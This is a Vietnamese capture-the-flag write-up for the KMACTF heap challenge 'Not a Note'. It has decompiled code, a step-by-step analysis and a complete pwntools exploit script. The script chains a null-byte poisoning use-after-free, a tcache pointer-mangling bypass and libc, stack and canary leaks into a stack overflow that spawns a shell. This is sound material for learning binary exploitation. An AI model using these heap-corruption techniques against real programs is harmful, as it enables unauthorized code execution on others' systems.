# Not a Note 

sau 1 tuần nằm viện thì giờ mình mới có thời gian để wu giải KMACTF

## Ida 

vì chall khá dài nên ta vừa đọc ida vừa phân tích luôn

### main

```c 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-14h] BYREF
  unsigned int v5; // [rsp+10h] [rbp-10h] BYREF
  int v6; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v7; // [rsp+18h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  v6 = 0;
  init(argc, argv, envp);
  while ( !v6 )
  {
    menu();
    __isoc99_scanf("%d", &v4);
    if ( v4 > 4 || (printf("Index: "), __isoc99_scanf("%d", &v5), v5 < 8) )
    {
      switch ( v4 )
      {
        case 1:
          create_note(v5);
          break;
        case 2:
          edit_note(v5);
          break;
        case 3:
          view_note(v5);
          break;
        case 4:
          delete_note(v5);
          break;
        case 5:
          v6 = 1;
          break;
        default:
          puts("Invalid choice!");
          break;
      }
    }
    else
    {
      puts("Invalid index!");
    }
  }
  return 0;
}
```

- chall cho ta 4 option là tạo, edit , print, và xóa 1 note

### create_note

```c 
unsigned __int64 __fastcall create_note(int a1)
{
  unsigned int v2; // [rsp+18h] [rbp-428h] BYREF
  unsigned int v3; // [rsp+1Ch] [rbp-424h] BYREF
  void *ptr; // [rsp+20h] [rbp-420h]
  char *dest; // [rsp+28h] [rbp-418h]
  char s[1032]; // [rsp+30h] [rbp-410h] BYREF
  unsigned __int64 v7; // [rsp+438h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  if ( *((_QWORD *)&note + a1) )
  {
    puts("Note exist!");
  }
  else
  {
    printf("Title size: ");
    __isoc99_scanf("%d", &v2);
    if ( v2 < 0x401 )
    {
      ptr = malloc((int)(v2 + 8));
      v2 = (*((_QWORD *)ptr - 1) & 0xFFFFFFF0) - 16;
      *((_QWORD *)&note + a1) = ptr;
      printf("Title: ");
      memset(s, 0, sizeof(s));
      read_str(s, v2);
      strcpy(*((char **)&note + a1), s);
      printf("Content size: ");
      __isoc99_scanf("%d", &v3);
      if ( v3 < 0x401 )
      {
        dest = (char *)malloc((int)v3);
        v3 = (*((_QWORD *)dest - 1) & 0xFFFFFFF0) - 16;
        *(_QWORD *)((int)v2 + *((_QWORD *)&note + a1)) = dest;
        printf("Content: ");
        memset(s, 0, sizeof(s));
        read_str(s, v3);
        strcpy(dest, s);
        puts("Done!\n\n");
      }
      else
      {
        puts("Invalid size!");
        memset(ptr, 0, (int)(v2 + 8));
        free(ptr);
        *((_QWORD *)&note + a1) = 0LL;
      }
    }
    else
    {
      puts("Invalid size!");
    }
  }
  return __readfsqword(0x28u) ^ v7;
}
```

- tạo 1 note bao gồm 1 idx đánh dấu, 1 chunk title và 1 chunk content có size < 0x401 => khó leak libc bằng unsorted bins thông thường 
- à đặc biệt là cuối title có chứa addr của thằng content 

### edit_note 

```c 
unsigned __int64 __fastcall edit_note(unsigned int a1)
{
  int v2; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( note[a1] )
  {
    do
    {
      puts("1. Edit title");
      puts("2. Edit content");
      puts("3. Back");
      printf("> ");
      __isoc99_scanf("%d", &v2);
      if ( v2 == 1 )
      {
        edit_title(a1);
      }
      else if ( v2 == 2 )
      {
        edit_content(a1);
      }
    }
    while ( v2 != 3 );
  }
  else
  {
    puts("Note doesn't exist!");
  }
  return __readfsqword(0x28u) ^ v3;
}

unsigned __int64 __fastcall edit_title(int a1)
{
  unsigned int v2; // [rsp+14h] [rbp-41Ch]
  char *dest; // [rsp+18h] [rbp-418h]
  char s[1032]; // [rsp+20h] [rbp-410h] BYREF
  unsigned __int64 v5; // [rsp+428h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  dest = (char *)note[a1];
  v2 = (*((_QWORD *)dest - 1) & 0xFFFFFFF0) - 16;
  printf("New title: ");
  memset(s, 0, sizeof(s));
  read_str(s, v2);
  strcpy(dest, s);
  puts("Done!\n\n");
  return __readfsqword(0x28u) ^ v5;
}

unsigned __int64 __fastcall edit_content(int a1)
{
  unsigned int v2; // [rsp+14h] [rbp-42Ch] BYREF
  int v3; // [rsp+18h] [rbp-428h]
  unsigned int v4; // [rsp+1Ch] [rbp-424h]
  __int64 v5; // [rsp+20h] [rbp-420h]
  void *s; // [rsp+28h] [rbp-418h]
  char src[1032]; // [rsp+30h] [rbp-410h] BYREF
  unsigned __int64 v8; // [rsp+438h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  printf("Content size: ");
  __isoc99_scanf("%d", &v2);
  if ( v2 < 0x401 )
  {
    v5 = note[a1];
    v3 = (*(_QWORD *)(v5 - 8) & 0xFFFFFFF0) - 16;
    s = *(void **)(note[a1] + v3);
    v4 = (*((_QWORD *)s - 1) & 0xFFFFFFF0) - 16;
    memset(s, 0, (int)v4);
    free(s);
    s = malloc((int)v2);
    v4 = (*((_QWORD *)s - 1) & 0xFFFFFFF0) - 16;
    *(_QWORD *)(v3 + note[a1]) = s;
    printf("Content: ");
    memset(src, 0, sizeof(src));
    read_str(src, v4);
    strcpy((char *)s, src);
    puts("Done!\n\n");
  }
  else
  {
    puts("Invalid size!");
  }
  return __readfsqword(0x28u) ^ v8;
}
```

- ở đây cho phép ta edit title và content
- để ý hàm edit_title không yêu cầu ta nhập size cho phép ta nhập thoải mái nên khả năng cao hàm này có bug cho ta khai thác 
- hàm edit_content thì free chunk cũ , tạo 1 chunk mới theo size ta vừa nhập

### view_note 

```c 
unsigned __int64 __fastcall view_note(int a1)
{
  int v2; // [rsp+18h] [rbp-428h]
  char *src; // [rsp+20h] [rbp-420h]
  char *v4; // [rsp+28h] [rbp-418h]
  char dest[1032]; // [rsp+30h] [rbp-410h] BYREF
  unsigned __int64 v6; // [rsp+438h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  if ( note[a1] )
  {
    src = (char *)note[a1];
    v2 = (*((_QWORD *)src - 1) & 0xFFFFFFF0) - 16;
    strcpy(dest, src);
    printf("Title: %s\n", src);
    v4 = *(char **)(note[a1] + v2);
    strcpy(dest, v4);
    printf("Content: %s\n", v4);
  }
  else
  {
    puts("Note doesn't exist!");
  }
  return __readfsqword(0x28u) ^ v6;
}
```

- đơn giản là in ra title và content trong 1 note 

### delete_note 

```c 
int __fastcall delete_note(int a1)
{
  int v2; // [rsp+18h] [rbp-18h]
  _QWORD *ptr; // [rsp+20h] [rbp-10h]
  void *s; // [rsp+28h] [rbp-8h]

  if ( !note[a1] )
    return puts("Note doesn't exist!");
  ptr = (_QWORD *)note[a1];
  v2 = (*(ptr - 1) & 0xFFFFFFF0) - 16;
  s = *(void **)((char *)ptr + v2);
  memset(s, 0, (int)((*((_QWORD *)s - 1) & 0xFFFFFFF0) - 16));
  free(s);
  memset(ptr, 0, v2 + 8);
  free(ptr);
  note[a1] = 0LL;
  return puts("Done!\n\n");
}
```

- ở đây thì free thằng content trước sau đó mới free thằng title 
- nếu để ý nãy giờ ta thấy có điều quang trọng là dữ liệu ta nhập sẽ được lưu trong stack, sau đó hàm strcpy() sẽ gán nó vào trong heap nên sẽ có 1 byte null ở cuối, cuối cùng hàm memset sẽ xóa dữ liệu trong stack đi 

![image](https://github.com/gookoosss/CTF/assets/128712571/43d9424b-735b-41d5-bb72-688f10cdbcc2)


- à chall còn cho sẵn ta 1 hàm tạo shell luôn, sẽ giúp ích cho việc ta khai thác

```c 
int read_function()
{
  return system("/bin/sh");
}
```

## Exploit 

### Leak Heap 
- vì chall này rất dài nên ta sẽ làm cái dễ nhất trước là leak heap 
- như phân tích ở trên thì ở cuối title sẽ có địa chỉ content , lợi dụng điều này ta leak được heap( chú ý tránh null byte)

```python 
add(0,0x50,b'A'*0x50,0x50,b'a'*0x50) #a2a0 #a300
edit_content(0,0x100,b'b'*160) #free a300 #a360
show(0)
p.recvuntil(b'A'*0x50)
heap_leak = u64(p.recv(6)+b'\0\0')
heap_base = heap_leak - 0x360
info("heap leak: " + hex(heap_leak))
info("heap base: " + hex(heap_base))
```

### Leak libc
- vì size bị giới hạn đến 0x400 rồi nên muốn vào được unsorted bins ta cần làm đầy tcache với size lớn hớn 0x80 để ko rơi vào fast bins, ta chọn size 0x120

```python 
# làm đầy tcache
size = 0x120
add(1,size,b"aaaa",size,b"bbbb") #a470 #a5a0
add(2,size,b"cccc",size,b"dddd") #a6d0 #a800
add(3,size,b"hlaan",size,b"hlaan") #a930 #aa60
add(4,size,b"a",size,b"a") #ab90 #acc0

delete(1)
delete(2)
delete(3)
delete(4)
```

![image](https://github.com/gookoosss/CTF/assets/128712571/3f4b278e-def0-4301-a344-6b18a819af11)


- đến đây ta nghĩ tạo 1 note size 0x50 để lấy thằng 0x559e6489a300 và 0x559e6489ab80 ra sau đó print ra là có libc :))) , nhưng mà khoan đã đâu có dễ vậy được

```python 
add(1,0x50,b'aaaa',0x50,b'b') #a300 #ab90
```

![image](https://github.com/gookoosss/CTF/assets/128712571/f70379fe-af1a-4e74-9516-6211a27ea702)


- vì hàm strcpy sẽ tạo thêm null byte ở cuối , khi ta print sẽ bị dừng tại null byte khiến ta ko thể leak được toàn bộ libc mà chỉ leak được 1 byte 'b'
- vậy lúc này thg strcpy là trở ngại của mk, thế làm sao để leak libc mà không phải đi qua hàm strcpy => nhảy số ra cách tạo fake chunk 

![image](https://github.com/gookoosss/CTF/assets/128712571/f970bbc9-e7f8-4055-ba91-16d94df74c7c)


- để ý thì thằng 0x55c2d8fc7350 đang lưu địa chỉ content của note 1, ta cần thay nó thành 1 địa chỉ khác chứa heap nên ta sẽ chọn nó làm fake chunk , nên cần set thêm size cho nó là 0x61
- lợi dụng edit_title idx = 0 để poison NULL byte 0x000055c2d8fc7360 thành 0x000055c2d8fc7300, sau đó free idx = 0
- mà 0x000055c2d8fc7300 đang là title của của idx 1 nên ta có lỗi UAF tại đây

```python 
add(1,0x50,b'aaaa',0x50,b'b') #a300 #ab90
edit_title(0,b'a'*0x50) #a2a0 #poison NULL
edit_content(1,0x100,b'AAAA') #adf0
delete(0) # UAF
payload = b'A'*0x48 + p64(0x61) # set size 0x61 to a350
edit_title(1,payload) #a300
```
![image](https://github.com/gookoosss/CTF/assets/128712571/4bf9dc30-462f-488a-b592-9698f73237d9)


- đến đây rồi ta cần học thêm 1 kiến thức mới đó là từ libc 2.31 trở nên sẽ có cơ chế xor nhằm bảo vệ tcache 
- xem thêm: https://hackmd.io/@trhoanglan04/SkrdeRm9n#tcache-protection-mechanism
- nôm na nó sẽ lấy addr chunk bỏ qua 12 bit , sau đó xor với addr next chunk => payload = (ptr >> 12) ^ need
- nên bây giờ ta cần gán thằng payload = (0x000055c2d8fc7300 >> 12) ^ 0x55c2d8fc7350, mục đích để đưa fake chunk 0x55c2d8fc7350 vào tcache 
- vì có null byte ở cuối sau khi strcpy nên ta cần gán 2 lần để xóa 2 byte đầu thành null byte 

```python  
#ptr >> 12 ^ addr
need = heap_base+0x350
ptr = heap_base+0x300
payload = (ptr >> 12) ^ need
edit_title(1,p64(payload)[0:6]+b'a')
edit_title(1,p64(payload)[0:6])
```

![image](https://github.com/gookoosss/CTF/assets/128712571/69e2f947-2f1e-4a05-935b-3ab24d0fd4d9)


- oke kết quả như ta mong đợi rồi ,h ta lấy thằng 0x55c2d8fc7350 và gán cho nó địa chỉ heap chứa libc thôi 

```python 
add(2,0x50,b'cccc',0x50,b'dddd')
payload = p64(heap_base+0xc60+0x10) # addr ubin(ab90) + 0x60 + 0x80
add(3,0x50,payload,0x70,b'a')
show(1)

p.recvuntil(b'Content: ')
libc_leak = u64(p.recv(6)+b'\0\0')
libc.address = libc_leak - 0x1f6ce0
info('libc leak: ' + hex(libc_leak))
info('libc base: ' + hex(libc.address))
```

### Leak stack 
- có được libc rồi ta dễ dàng leak stack nhờ environ trong libc 


![image](https://github.com/gookoosss/CTF/assets/128712571/4189f8a0-82f3-4761-a52c-73debf983653)


```python 
environ = libc.sym['environ']
edit_title(3,p64(environ)[0:6]) #350
show(1)
p.recvuntil(b'Content: ')
stack_leak = u64(p.recv(6)+b'\0\0')
info("stack leak: " + hex(stack_leak))
```

### Leak exe 

- có được stack rồi ta cũng dễ dàng leak exe 

![image](https://github.com/gookoosss/CTF/assets/128712571/5e4eb632-a1e8-449b-bdb3-b01746a3a827)


```python 
leak_main = stack_leak-0x110
edit_title(3,p64(leak_main)[0:6]) #350
show(1)
p.recvuntil(b'Content: ')
exe_leak = u64(p.recv(6)+b'\0\0')
exe.address = exe_leak - exe.sym['main']
info("exe leak: " + hex(exe_leak))
info("exe base: " + hex(exe.address))
```

### Leak canary 

- tương tự như trên , sử dụng stack để leak canary

```python 
leak_canary = stack_leak-0x12f
edit_title(3,p64(leak_canary)[0:6]) #350
show(1)
p.recvuntil(b'Content: ')
canary = u64(b'\0' + p.recv(7))
info("canary: " + hex(canary))
```

### Get shell

- có đầy đủ những thứ ta cần rồi, giờ là lúc ta lấy shell
- như phân tích ở trên thì mọi dữ liệu ta nhập vào đều lưu trên stack trước sau đó mới đưa vào heap, vậy ta hoàn toàn có thể ret2win được 
- ta sẽ chọn hàm edit_title để ret2win, nhưng mà trước đó ta cần set lại size cho fake chunk thành 0xffff để có thể nhập thoải mái 
```python 
payload = b'a'*0x48 + p64(0xffff)
edit_title(1,payload)

payload = b'b'*0x408 + p64(canary) + b'a'*8 + p64(exe.sym['read_function'] + 5)

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Index: ', str(3))
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'title: ', payload)
```

- cuối cùng thì ta cũng lấy được shell 

![image](https://github.com/gookoosss/CTF/assets/128712571/cc0e23c2-f46b-482b-81fe-c157a1eff8ce)


## script 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./notanote_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.37.so")

context.binary = exe

p = process([exe.path])
        
gdb.attach(p, gdbscript = '''
b*create_note+183
b*create_note+538
b*create_note+486
b*create_note+360
b*create_note+709
b*edit_content+480
b*edit_note+163
b*edit_note+183
b*edit_content+293
b*edit_content+309
b*view_note+75
b*view_note+192
b*view_note+318
b*delete_note+198
b*delete_note+236
b*edit_title+181
c
''')
           
input()

def add(idx, size1, data1, size2, data2):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index: ', str(idx))
    p.sendlineafter(b'size: ', str(size1))
    p.sendlineafter(b'Title: ', data1)
    p.sendlineafter(b'size: ', str(size2))
    p.sendlineafter(b'Content: ', data2)

def edit_title(idx, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx))
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'title: ', data)
    p.sendlineafter(b'> ', b'3')


def edit_content(idx,size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx))
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'size: ', str(size))
    p.sendlineafter(b'Content: ', data)
    p.sendlineafter(b'> ', b'3')

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx))

def delete(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index: ', str(idx))


add(0,0x50,b'A'*0x50,0x50,b'a'*0x50) #a2a0 #a300
edit_content(0,0x100,b'b'*160) #free a300 #a360
show(0)
p.recvuntil(b'A'*0x50)
heap_leak = u64(p.recv(6)+b'\0\0')
heap_base = heap_leak - 0x360
info("heap leak: " + hex(heap_leak))
info("heap base: " + hex(heap_base))

# làm đầy tcache
size = 0x120
add(1,size,b"aaaa",size,b"bbbb") #a470 #a5a0
add(2,size,b"cccc",size,b"dddd") #a6d0 #a800
add(3,size,b"hlaan",size,b"hlaan") #a930 #aa60
add(4,size,b"a",size,b"a") #ab90 #acc0

delete(1)
delete(2)
delete(3)
delete(4)

# tạo fake chunk 

add(1,0x50,b'aaaa',0x50,b'b') #a300 #ab90
edit_title(0,b'a'*0x50) #a2a0 #poison NULL
edit_content(1,0x100,b'AAAA') #adf0
delete(0)
payload = b'A'*0x48 + p64(0x61) # set size 0x61 to a350
edit_title(1,payload) #a300



#ptr >> 12 ^ addr
need = heap_base+0x350
ptr = heap_base+0x300
payload = (ptr >> 12) ^ need
edit_title(1,p64(payload)[0:6]+b'a')
edit_title(1,p64(payload)[0:6])
add(2,0x50,b'cccc',0x50,b'dddd')
payload = p64(heap_base+0xc60+0x10) # addr ubin(ab90) + 0x60 + 0x80
add(3,0x50,payload,0x70,b'a')
show(1)

p.recvuntil(b'Content: ')
libc_leak = u64(p.recv(6)+b'\0\0')
libc.address = libc_leak - 0x1f6ce0
info('libc leak: ' + hex(libc_leak))
info('libc base: ' + hex(libc.address))

environ = libc.sym['environ']
edit_title(3,p64(environ)[0:6]) #350
show(1)
p.recvuntil(b'Content: ')
stack_leak = u64(p.recv(6)+b'\0\0')
info("stack leak: " + hex(stack_leak))

leak_main = stack_leak-0x110
edit_title(3,p64(leak_main)[0:6]) #350
show(1)
p.recvuntil(b'Content: ')
exe_leak = u64(p.recv(6)+b'\0\0')
exe.address = exe_leak - exe.sym['main']
info("exe leak: " + hex(exe_leak))
info("exe base: " + hex(exe.address))

leak_canary = stack_leak-0x12f
edit_title(3,p64(leak_canary)[0:6]) #350
show(1)
p.recvuntil(b'Content: ')
canary = u64(b'\0' + p.recv(7))
info("canary: " + hex(canary))

payload = b'a'*0x48 + p64(0xffff)
edit_title(1,payload)

payload = b'b'*0x408 + p64(canary) + b'a'*8 + p64(exe.sym['read_function'] + 5)

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Index: ', str(3))
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'title: ', payload)


p.interactive()
```


